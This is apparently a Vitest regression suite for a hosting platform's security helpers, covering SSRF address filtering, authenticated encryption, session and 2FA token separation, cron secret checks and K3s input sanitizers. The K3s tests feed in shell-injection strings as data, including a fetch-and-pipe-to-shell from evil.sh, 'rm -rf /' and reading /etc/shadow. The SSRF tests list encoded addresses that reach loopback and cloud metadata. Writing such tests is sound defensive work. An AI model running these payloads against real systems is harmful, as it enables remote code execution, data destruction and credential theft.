import { describe, it, expect, vi, beforeAll, afterAll } from 'vitest';
import crypto from 'crypto';

vi.mock('@/lib/prisma', () => ({
  prisma: {},
}));

import { isPrivateIp, validateSafeUrl } from '../ssrf';
import {
  encryptAuthenticated,
  decryptAuthenticated,
  hashPassword,
  verifyPassword,
} from '../encryption';
import {
  createSessionToken,
  getSessionPayload,
  create2FAChallengeToken,
  verify2FAChallengeToken,
  signDomainToken,
  verifyDomainToken,
} from '../session';
import { verifyCronSecret } from '../cron-auth';
import { calculateMinimumBaseVpsRate } from '../vps-billing-rate';
import { K3sProvisioningService } from '../k3s-provisioning';

describe('Bank-Grade Security Hardening Regression Suite', () => {
  const originalEnv = { ...process.env };

  beforeAll(() => {
    process.env.ENCRYPTION_KEY = crypto.randomBytes(32).toString('hex');
    process.env.DETERMINISTIC_IV = crypto.randomBytes(16).toString('hex');
    process.env.SESSION_SECRET = crypto.randomBytes(32).toString('hex');
  });

  afterAll(() => {
    process.env = originalEnv;
  });

  describe('1. Advanced IPv6 / NAT64 / 6to4 / Credential SSRF Defenses', () => {
    it('blocks case-insensitive dotted IPv4-mapped IPv6 addresses', () => {
      expect(isPrivateIp('::ffff:127.0.0.1')).toBe(true);
      expect(isPrivateIp('::FFFF:127.0.0.1')).toBe(true);
      expect(isPrivateIp('::FFFF:169.254.169.254')).toBe(true);
      expect(isPrivateIp('::ffff:10.42.0.1')).toBe(true);
      expect(isPrivateIp('::ffff:8.8.8.8')).toBe(false);
    });

    it('blocks hex-encoded IPv4-mapped, NAT64, 6to4, and Teredo IPv6 bypasses', () => {
      // ::ffff:127.0.0.1 in hex form
      expect(isPrivateIp('::ffff:7f00:1')).toBe(true);
      expect(isPrivateIp('0:0:0:0:0:ffff:a9fe:a9fe')).toBe(true);
      // NAT64 well-known prefix 64:ff9b::/96 targeting loopback & metadata
      expect(isPrivateIp('64:ff9b::7f00:1')).toBe(true);
      expect(isPrivateIp('64:ff9b::a9fe:a9fe')).toBe(true);
      // 6to4 2002::/16 embedding 127.0.0.1 and 192.168.1.1
      expect(isPrivateIp('2002:7f00:0001::1')).toBe(true);
      expect(isPrivateIp('2002:c0a8:0101::1')).toBe(true);
      // Teredo 2001:0000::/32
      expect(isPrivateIp('2001:0000:4136:e378:8000:63bf:3fff:fdd2')).toBe(true);
    });

    it('blocks Carrier-Grade NAT (100.64.0.0/10) while permitting adjacent public ranges', () => {
      expect(isPrivateIp('100.64.0.1')).toBe(true);
      expect(isPrivateIp('100.127.255.254')).toBe(true);
      expect(isPrivateIp('100.63.255.254')).toBe(false);
      expect(isPrivateIp('100.128.0.1')).toBe(false);
    });

    it('blocks bracketed IPv6 loopback and embedded URL credentials in validateSafeUrl()', async () => {
      const ipv6Loopback = await validateSafeUrl('https://[::1]:443/api');
      expect(ipv6Loopback.safe).toBe(false);

      const mappedMetadata = await validateSafeUrl('https://[::ffff:169.254.169.254]/latest/meta-data');
      expect(mappedMetadata.safe).toBe(false);

      const embeddedCreds = await validateSafeUrl('https://user:pass@example.com/resource');
      expect(embeddedCreds.safe).toBe(false);
      expect(embeddedCreds.reason).toContain('credentials');
    });
  });

  describe('2. AES-256-GCM Authenticated Encryption & Scrypt DoS Protection', () => {
    it('encrypts and decrypts with HKDF context separation and rejects tampering', () => {
      const payload = JSON.stringify({ vmid: 105, ticket: 'PVE:vnc:ticket' });
      const sealed = encryptAuthenticated(payload, 'vnc-session-v2');

      expect(sealed.startsWith('gcm:')).toBe(true);
      expect(decryptAuthenticated(sealed, 'vnc-session-v2')).toBe(payload);

      // Wrong HKDF context must fail authentication
      expect(decryptAuthenticated(sealed, 'different-context')).toBe(null);

      // Tampering with ciphertext or auth tag must return null
      const parts = sealed.split(':');
      const flippedTag =
        (parts[2][0] === 'a' ? 'b' : 'a') + parts[2].slice(1);
      const tampered = `${parts[0]}:${parts[1]}:${flippedTag}:${parts[3]}`;
      expect(decryptAuthenticated(tampered, 'vnc-session-v2')).toBe(null);
    });

    it('enforces 256-byte password length cap to prevent scrypt CPU exhaustion', () => {
      const hugePassword = 'A'.repeat(300);
      expect(() => hashPassword(hugePassword)).toThrow(/maximum allowed length/i);

      const normalHash = hashPassword('ValidPass#2026');
      expect(verifyPassword(hugePassword, normalHash)).toBe(false);
    });
  });

  describe('3. Session, 2FA Challenge & Domain-Separated HMAC Isolation', () => {
    it('prevents cross-domain token confusion between 2FA challenges and active sessions', () => {
      const challengeToken = create2FAChallengeToken(42, true);
      const verifiedChallenge = verify2FAChallengeToken(challengeToken);

      expect(verifiedChallenge).not.toBeNull();
      expect(verifiedChallenge?.userId).toBe(42);
      expect(verifiedChallenge?.purpose).toBe('2fa_challenge');

      // A 2FA challenge token MUST NOT be accepted as a full login session
      expect(getSessionPayload(challengeToken)).toBeNull();

      // A full session token MUST NOT be accepted as a 2FA challenge token
      const { token: sessionToken } = createSessionToken(42, 'ADMIN', false, undefined, {
        impersonatedBy: 1,
      });
      expect(verify2FAChallengeToken(sessionToken)).toBeNull();

      const sessionPayload = getSessionPayload(sessionToken);
      expect(sessionPayload?.userId).toBe(42);
      expect(sessionPayload?.impersonatedBy).toBe(1);
    });

    it('isolates domain-separated HMAC signatures across features', () => {
      const data = 'comment-payload-base64';
      const sig = signDomainToken('comment-verify', data);

      expect(verifyDomainToken('comment-verify', data, sig)).toBe(true);
      expect(verifyDomainToken('2fa-challenge', data, sig)).toBe(false);
      expect(verifyDomainToken('comment-verify', `${data}-tampered`, sig)).toBe(false);
    });
  });

  describe('4. Constant-Time Cron Secret Verification', () => {
    it('fails closed when CRON_SECRET is missing and validates exact Bearer token', () => {
      const dynamicCronToken = crypto.randomBytes(24).toString('hex');
      delete process.env.CRON_SECRET;

      const reqWithoutEnv = new Request('https://masdika.id/api/cron/billing', {
        headers: { authorization: `Bearer ${dynamicCronToken}` },
      });
      expect(verifyCronSecret(reqWithoutEnv)).toBe(false);

      process.env.CRON_SECRET = dynamicCronToken;

      const validReq = new Request('https://masdika.id/api/cron/billing', {
        headers: { authorization: `Bearer ${dynamicCronToken}` },
      });
      expect(verifyCronSecret(validReq)).toBe(true);

      const wrongReq = new Request('https://masdika.id/api/cron/billing', {
        headers: { authorization: `Bearer ${dynamicCronToken}-wrong` },
      });
      expect(verifyCronSecret(wrongReq)).toBe(false);
    });
  });

  describe('5. Billing Floor & K3s Command-Injection Sanitizers', () => {
    it('enforces unbreakable minimum base hourly rate floor for PAYG VPS', () => {
      const floor = calculateMinimumBaseVpsRate(
        { cpuCores: 4, ramGb: 8, diskGb: 50, diskType: 'SSD', backupGb: 20 },
        { vcpu: 100, ram: 50, diskSsd: 5, disk: 2, backup: 1 }
      );
      // 4*100 + 8*50 + 50*5 + 20*1 = 400 + 400 + 250 + 20 = 1070
      expect(floor).toBe(1070);
    });

    it('neutralizes shell injection payloads in K3s provisioning helpers', () => {
      expect(K3sProvisioningService.sanitizeK3sChannel("v1.31' && id #")).toBe('v1.31');
      expect(K3sProvisioningService.sanitizeK3sChannel('; curl evil.sh | sh')).toBe('v1.31');
      expect(K3sProvisioningService.sanitizeK3sChannel('v1.30.4+k3s1')).toBe('v1.30.4+k3s1');

      expect(
        K3sProvisioningService.sanitizeHostname('master$(whoami);rm -rf /', 'k3s-master')
      ).toBe('master--whoami--rm--rf');

      expect(() =>
        K3sProvisioningService.validateIpv4OrThrow('10.0.0.1; id')
      ).toThrow();
      expect(() =>
        K3sProvisioningService.validateIpv4OrThrow('999.0.0.1')
      ).toThrow();
      expect(K3sProvisioningService.validateIpv4OrThrow('10.10.0.5')).toBe('10.10.0.5');

      expect(() =>
        K3sProvisioningService.validateNodeTokenOrThrow("K10abc' || cat /etc/shadow #")
      ).toThrow();
      expect(
        K3sProvisioningService.validateNodeTokenOrThrow('K10abcdef123456::server:9876543210')
      ).toBe('K10abcdef123456::server:9876543210');
    });
  });
});
